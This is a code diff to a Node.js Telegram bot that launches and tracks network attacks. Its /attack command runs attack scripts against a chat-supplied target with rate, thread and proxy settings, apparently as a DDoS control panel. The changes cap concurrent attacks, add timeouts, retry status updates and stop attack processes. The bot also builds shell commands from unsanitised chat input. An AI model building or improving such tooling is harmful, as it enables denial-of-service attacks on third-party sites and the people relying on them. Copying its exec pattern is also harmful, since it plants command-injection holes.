@@ -103,6 +103,11 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     return
   }
 
+  if (attacks.length >= 5) {
+    bot.sendMessage(msg.chat.id, 'Too many active attacks. Please wait.')
+    return
+  }
+
   const attackId = Date.now()
   const attackData = {
     id: attackId,
@@ -128,14 +133,16 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
   }, null, 2) + '\n```', { parse_mode: 'Markdown' })
   attackData.messageId = sentMsg.message_id
 
-  const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err, stdout, stderr) => {
+  const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, { timeout: time * 1000 + 1000 }, (err, stdout, stderr) => {
     if (err) {
-      bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}\n${stderr || 'No stderr output'}`)
+      bot.sendMessage(msg.chat.id, `Attack failed: ${err.message || 'Unknown error'}\n${stderr || 'No stderr output'}`)
       attacks = attacks.filter(a => a.id !== attackId)
       bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
       return
     }
     bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully\n${stdout || 'No stdout output'}`)
+    attacks = attacks.filter(a => a.id !== attackId)
+    bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
   })
 
   child.on('error', (err) => {
@@ -148,41 +155,62 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     attackData.pid = child.pid
     attacks.push(attackData)
 
-    const interval = setInterval(() => {
+    const interval = setInterval(async () => {
       const now = Date.now()
       const remainingTime = Math.max(0, Math.round((attackData.endTime - now) / 1000))
       attackData.status = 'running'
 
       if (remainingTime <= 0 || !attacks.find(a => a.id === attackId)) {
         clearInterval(interval)
-        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
         attacks = attacks.filter(a => a.id !== attackId)
+        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
         return
       }
 
-      bot.editMessageText('```json\n' + JSON.stringify({
-        status: attackData.status,
-        method,
-        target,
-        time: remainingTime,
-        rate,
-        threads,
-        proxyfile
-      }, null, 2) + '\n```', {
-        chat_id: msg.chat.id,
-        message_id: attackData.messageId,
-        parse_mode: 'Markdown'
-      }).catch((err) => {
-        bot.sendMessage(msg.chat.id, `Error updating attack status: ${err.message}`)
-        clearInterval(interval)
-        attacks = attacks.filter(a => a.id !== attackId)
-      })
-    }, 5000)
-  })
-
-  child.on('exit', () => {
-    attacks = attacks.filter(a => a.id !== attackId)
-    bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
+      try {
+        await bot.editMessageText('```json\n' + JSON.stringify({
+          status: attackData.status,
+          method,
+          target,
+          time: remainingTime,
+          rate,
+          threads,
+          proxyfile
+        }, null, 2) + '\n```', {
+          chat_id: msg.chat.id,
+          message_id: attackData.messageId,
+          parse_mode: 'Markdown'
+        })
+      } catch (err) {
+        if (err.code === 429) {
+          setTimeout(async () => {
+            try {
+              await bot.editMessageText('```json\n' + JSON.stringify({
+                status: attackData.status,
+                method,
+                target,
+                time: remainingTime,
+                rate,
+                threads,
+                proxyfile
+              }, null, 2) + '\n```', {
+                chat_id: msg.chat.id,
+                message_id: attackData.messageId,
+                parse_mode: 'Markdown'
+              })
+            } catch (retryErr) {
+              bot.sendMessage(msg.chat.id, `Retry failed: ${retryErr.message}`)
+              clearInterval(interval)
+              attacks = attacks.filter(a => a.id !== attackId)
+            }
+          }, 2000)
+        } else {
+          bot.sendMessage(msg.chat.id, `Error updating attack status: ${err.message}`)
+          clearInterval(interval)
+          attacks = attacks.filter(a => a.id !== attackId)
+        }
+      }
+    }, 10000)
   })
 
   bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
@@ -222,7 +250,7 @@ bot.onText(/^\/stop(?:\s(.+))?/, (msg, match) => {
 
   attacks = attacks.filter(a => a.id !== attackId)
   try {
-    process.kill(attack.pid)
+    process.kill(attack.pid, 'SIGTERM')
     bot.deleteMessage(msg.chat.id, attack.messageId).catch(() => {})
     bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`)
   } catch (e) {
